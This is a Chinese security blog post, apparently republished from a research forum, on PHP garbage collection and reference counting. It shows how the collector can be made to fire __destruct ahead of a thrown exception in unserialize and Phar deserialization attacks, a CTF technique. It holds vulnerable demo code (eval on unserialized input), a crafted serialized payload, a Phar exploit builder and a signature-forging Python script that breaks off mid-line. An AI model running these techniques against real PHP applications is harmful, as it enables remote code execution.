{"title":"浅析PHP GC垃圾回收机制","uid":"6a30ccf7eba1a3b7e415165a3f83319a","slug":"浅析 PHP GC垃圾回收机制","date":"2022-11-15T13:20:20.000Z","updated":"2023-03-14T07:40:06.000Z","comments":true,"path":"api/articles/浅析 PHP GC垃圾回收机制.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141500019.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于先知社区<a href=\"https://xz.aliyun.com/t/11843\">https://xz.aliyun.com/t/11843</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>上周战队知识分享时，<code>H3018</code>大师傅讲了<code>PHP GC</code>回收机制的利用，学会了如何去绕过抛出异常。<code>H3018</code>大师傅讲述的很清楚，<br>大家有兴趣的可以去看一下哇，链接如下<br><a href=\"https://www.bilibili.com/video/BV16g411s7CH/?spm_id_from=333.999.0.0&vd_source=414113f33a1cd681c43e79462250b4d0\">https://www.bilibili.com/video/BV16g411s7CH/</a><br>这里没有怎么涉及底层原理，只是将我自己的见解简述一下，希望能对正在学习PHP反序列化的师傅有所帮助。</p>\n<h1 id=\"GC\"><a href=\"#GC\" class=\"headerlink\" title=\"GC\"></a>GC</h1><h2 id=\"什么是GC\"><a href=\"#什么是GC\" class=\"headerlink\" title=\"什么是GC\"></a>什么是GC</h2><p><code>Gc</code>，全称<code>Garbage collection</code>，即垃圾回收机制。<br>在PHP中有这个<code>GC</code>机制</p>\n<h2 id=\"PHP中的GC\"><a href=\"#PHP中的GC\" class=\"headerlink\" title=\"PHP中的GC\"></a>PHP中的GC</h2><p>在PHP中，使用<code>引用计数</code>和<code>回收周期</code>来自动管理内存对象的，当一个变量被设置为<code>NULL</code>，或者没有任何指针指向<br>时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉<br>那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被<code>GC</code>机制回收，在回收的过程中，它会自动触发<code>_destruct</code>方法，而这也就是我们绕过抛出异常的关键点。</p>\n<p>上文说到PHP是使用<code>引用计数</code>来进行管理的，接下来简单说一下。</p>\n<h3 id=\"引用计数\"><a href=\"#引用计数\" class=\"headerlink\" title=\"引用计数\"></a>引用计数</h3><p>当我们PHP创建一个变量时，这个变量会被存储在一个名为<code>zval</code>的变量容器中。在这个<code>zval</code>变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。</p>\n<p>第一个字节名为<code>is_ref</code>，是<code>bool</code>值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用<code>&amp;</code>来使用自定义引用，<code>zval</code>变量容器中还有一个内部引用计数机制，来优化内存使用。</p>\n<p>第二个字节是<code>refcount</code>，它用来表示指向<code>zval</code>变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。 </p>\n<p>看接下来的这个例子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"new string\"</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">xdebug_debug_zval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//用于查看变量a的zval变量容器的内容</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们可以看到这里定义了一个变量<code>$a</code>，生成了类型为<code>String</code>和值为<code>new string</code>的变量容器，而对于两个额外的字节，<code>is_ref</code>和<code>refcount</code>，我们这里可以看到是不存在引用的，所以<code>is_ref</code>的值应该是false，而<code>refcount</code>是表示变量个数的，那么这里就应该是1，接下来我们验证一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459091.png\" alt=\"在这里插入图片描述\"><br>接下来我们添加一个引用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"new string\"</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">xdebug_debug_zval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>按照之前的思路，每生成一个变量就有一个<code>zval</code>记录其类型和值以及两个额外字节，那我们这里的话a的<code>refcount</code>应该是1，<code>is_ref</code>应该是<code>true</code>，接下来我们验证一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459096.png\" alt=\"在这里插入图片描述\"><br>哎，结果不同于我们所想的，这是为什么呢？<br>因为同一变量容器被变量a和变量b关联，当没必要时,php不会去复制已生成的变量容器。<br>所以这一个<code>zval</code>容器存储了<code>a</code>和<code>b</code>两个变量，就使得<code>refcount</code>的值为2.</p>\n<p>接下来说一下容器的销毁这个事。<br>变量容器在<code>refcount</code>变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,<code>refcount</code>就会减1。<br>看个例子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"new string\"</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">xdebug_debug_zval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">xdebug_debug_zval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>按照刚刚所说，那么这里的首次输出的<code>is_ref</code>应该是<code>true</code>，<code>refcount</code>为3。<br>第二次输出的<code>is_ref</code>值是什么呢，我们可以看到引用<code>$a</code>的变量<code>$b</code>和<code>$c</code>都被<code>unset</code>了，所以这里的<code>is_ref</code>应该是<code>false</code>，也是因为<code>unset</code>，这里的<code>refcount</code>应该从<code>3</code>变成了<code>1</code>，接下来验证一下<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459086.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"GC在PHP-反序列化中的利用\"><a href=\"#GC在PHP-反序列化中的利用\" class=\"headerlink\" title=\"GC在PHP 反序列化中的利用\"></a>GC在PHP 反序列化中的利用</h1><p><code>GC</code>如果在PHP反序列化中生效，那它就会直接触发<code>_destruct</code>方法，接下来以例子来演示。</p>\n<h2 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h2><p>首先来看变量被<code>unset</code>函数处理的情况</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">num</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"__construct\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">num</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"__destruct()\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459119.png\" alt=\"在这里插入图片描述\"><br>这个是一种方法，还有一种方法，如下。<br>我们知道当对象为<code>NULL</code>时也是可以触发<code>_destruct</code>的，所以我们这里的话来试一下反序列化一个数组，然后写入第一个索引为对象，将第二个赋值为<code>0</code>，看一下能否触发。(原理我感觉应该是给第一个对象赋值为0键时，此时又将0赋值给了另一个，就相当于它失去了引用，被视为垃圾给回收了)<br>demo如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'你想干什么'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们可以看到这里在反序列化后就抛出异常了，如果按照正常的话，是无法触发<code>_destruct</code>的，我们按照先前所想，这里先反序列化一个数组</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到序列化文本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"B\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n对象类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">:</span>类名<span class=\"token punctuation\">:</span>值类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n数组<span class=\"token punctuation\">:</span>长度为<span class=\"token number\">2</span><span class=\"token operator\">::</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword type-declaration\">int</span>型<span class=\"token punctuation\">:</span>长度<span class=\"token number\">0</span><span class=\"token punctuation\">;</span>类<span class=\"token punctuation\">:</span>长度为<span class=\"token number\">1</span><span class=\"token punctuation\">:</span>类名为<span class=\"token string double-quoted-string\">\"B\"</span><span class=\"token punctuation\">:</span>值为<span class=\"token number\">0</span> <span class=\"token keyword type-declaration\">int</span>型<span class=\"token punctuation\">:</span>值为<span class=\"token number\">1</span>：<span class=\"token keyword type-declaration\">int</span>型<span class=\"token punctuation\">;</span>值为<span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来我们按照我们所想，将第二个索引置空，就可以触发<code>GC</code>回收机制，因此修改序列化文本为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"B\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>去尝试一下<br>成功触发，看到这里也就知道了大致的思路<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459134.png\" alt=\"在这里插入图片描述\"><br>这里可以看到也是成功提前触发了<code>_destruct</code>，因为如果正常情况的话，有异常抛出就无法再触发<code>_destruct</code>了，而这个思路也是我们在CTF中绕过异常的一个方法。</p>\n<h1 id=\"Gc在Phar反序列化中的利用\"><a href=\"#Gc在Phar反序列化中的利用\" class=\"headerlink\" title=\"Gc在Phar反序列化中的利用\"></a>Gc在Phar反序列化中的利用</h1><p>Gc在Phar反序列化中类似于PHP反序列化，也是当遇到抛出异常时，可以借用上面的方法来实现绕过，下面以demo来简单讲解一下。</p>\n<h2 id=\"demo-1\"><a href=\"#demo-1\" class=\"headerlink\" title=\"demo\"></a>demo</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Garbage collection\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到<code>file_get_contents</code>函数和类，就想到Phar反序列化，所以接下来尝试借助<code>file_get_contents</code>方法来进行反序列化(因为这里只是本地测试一下，所以不再设置文件上传那些，直接将生成的Phar文件放置本地进行利用了)。<br>构造Exp如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"phpinfo();\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.phar'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//后缀名必须为phar</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//开始缓冲 Phar 写操作</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//自定义的meta-data存入manifest</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER();?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//添加要压缩的文件</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注：需要去检查一下php.ini中的phar.readonly选项，如果是On，需要修改为Off。否则会报错，无法生成phar文件<br>小Tip: 这里如果有师傅不懂为什么这样写，可以学一下Phar反序列化，我之前也写过一篇关于Phar反序列化的文章，<br>师傅们可以参考一下<a href=\"https://tttang.com/archive/1732/\">https://tttang.com/archive/1732/</a></p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459185.png\" alt=\"在这里插入图片描述\"><br>用<code>010editor</code>打开phar文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459514.png\" alt=\"在这里插入图片描述\"><br>可以发现<code>i:1</code>，按照我们之前的思路，我们这里将<code>i:1</code>修改成<code>i:0</code>就可以绕过抛出异常，但在Phar文件中，我们是不能任意修改数据的，否则就会因为签名错误而导致文件出错，不过签名是可以进行伪造的，所以我们先将<code>1.phar</code>中的<code>i:1</code>修改为<code>i:0</code>，接下来利用脚本使得签名正确。<br>脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import gzip\nfrom hashlib import sha1\nwith <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\html\\\\1.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> file<span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> file<span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \ns <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取要签名的数据</span>\nh <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取签名类型以及GBMB标识</span>\nnewf <span class=\"token operator\">=</span> s <span class=\"token operator\">+</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token 